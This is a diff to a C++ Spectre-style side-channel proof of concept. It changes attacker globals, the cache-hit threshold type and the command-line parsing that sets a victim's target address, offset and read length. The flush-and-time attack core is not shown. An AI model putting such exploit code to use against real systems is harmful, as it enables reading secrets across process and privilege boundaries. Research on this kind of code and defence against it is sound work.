@@ -43,9 +43,9 @@
 /********************************************************************
 Attacker globals.
 ********************************************************************/
-void* target_va;        // VM Address of victim's array (e.g. array1[])
-size_t target_x_offset; // Offset relative to victim's array
-size_t target_size;     // Number of bytes to attempt to read at offset
+void* target_va;          // VM Address of victim's array (e.g. array1[])
+int64_t target_x_offset;  // Offset relative to victim's array
+size_t target_size;       // Number of bytes to attempt to read at offset
 
 
 /********************************************************************
@@ -59,7 +59,7 @@ const uint8_t* array2;
 Analysis code
 ********************************************************************/
 /* Default to a cache hit threshold of 80 */
-int cache_hit_threshold = 80; // make me a compile-time constexpr...?
+uint64_t cache_hit_threshold = 80; // TODO: compile-time constexpr...?
 
 std::vector< std::bitset<256> > measurements;  // timeseries of measurements
 int results[256]; // score / byte
@@ -87,7 +87,7 @@ void flush_memory_sse(uint8_t * addr)
 
 
 /* Report best guess in value[0] and runner-up in value[1] */
-void readMemoryByte(int cache_hit_threshold, size_t malicious_x,
+void readMemoryByte(uint64_t cache_hit_threshold, size_t malicious_x,
                     uint8_t value[2], int score[2]) {
   static int results[256];
   unsigned int junk = 0;
@@ -364,7 +364,7 @@ void init_pages() {
   // Read from array2 to ensure mapping of pages:
   array2 = sm_ptr->array2;
   volatile uint8_t tmp;
-  for (auto i = 0; i < sizeof(region::array2); i += PAGE_SIZE) {
+  for (size_t i = 0; i < sizeof(region::array2); i += PAGE_SIZE) {
     tmp ^= array2[i];
   }
 }
@@ -396,48 +396,52 @@ void print_config() {
 }
 
 auto parse_args(int argc, char* const argv[]) {
-  // iterate...
+//  void* target_va;          // VM Address of victim's array (e.g. array1[])
+//  int64_t target_x_offset;  // Offset relative to victim's array
+//  size_t target_size;       // Number of bytes to attempt to read at offset
 
   int c;
-  while ( (c = getopt(argc, argv, "pslo")) != -1) {
+  while ( (c = getopt(argc, argv, "p:s:l:o:c:")) != -1) {
     switch (c) {
     case 'p':
-      //
+      target_va = reinterpret_cast<void*>(atoll(optarg));
       break;
     case 's':
     case 'l':
-      //
+      target_size = atoll(optarg);
       break;
     case 'o':
-      //
+      target_x_offset = atoll(optarg);
       break;
+    case 'c':
+      cache_hit_threshold = atoi(optarg);
     case '?':
-      std::cerr << "Unknown argument..." << std::endl;
+      std::cerr << "Unknown argument: " << optopt << std::endl;
     default:
       exit(EXIT_FAILURE);
     }
   }
 
-  // Calculate target index-offset (bytes) from Victim's vulnerability (array1):
-///  size_t malicious_x = (size_t)(secret - (char *)array1);
-  size_t malicious_x = 0;
-  int len = 8;
-  /* Parse the Victim's secret virtual-address and length from the first and second
-     command line argument. (OPTIONAL) */
-  if (argc >= 3) {
-    sscanf(argv[1], "%p", (void **)(&malicious_x));
+//  // Calculate target index-offset (bytes) from Victim's vulnerability (array1):
+//  size_t malicious_x = 0;
+//  int len = 8;
+/////  size_t malicious_x = (size_t)(secret - (char *)array1);
+//  /* Parse the Victim's secret virtual-address and length from the first and second
+//     command line argument. (OPTIONAL) */
+//  if (argc >= 3) {
+//    sscanf(argv[1], "%p", (void **)(&malicious_x));
 
-    /* Convert input value into a pointer */
-//    malicious_x -= (size_t)array1;
+//    /* Convert input value into a pointer */
+////    malicious_x -= (size_t)array1;
 
-    sscanf(argv[2], "%d", &len);
-  }
+//    sscanf(argv[2], "%d", &len);
+//  }
 
-  /* Parse the cache_hit_threshold from the first command line argument.
-     (OPTIONAL) */
-  if (argc >= 4) {
-    sscanf(argv[3], "%d", &cache_hit_threshold);
-  }
+//  /* Parse the cache_hit_threshold from the first command line argument.
+//     (OPTIONAL) */
+//  if (argc >= 4) {
+//    sscanf(argv[3], "%d", &cache_hit_threshold);
+//  }
 
   // return tuple...
   return 0;
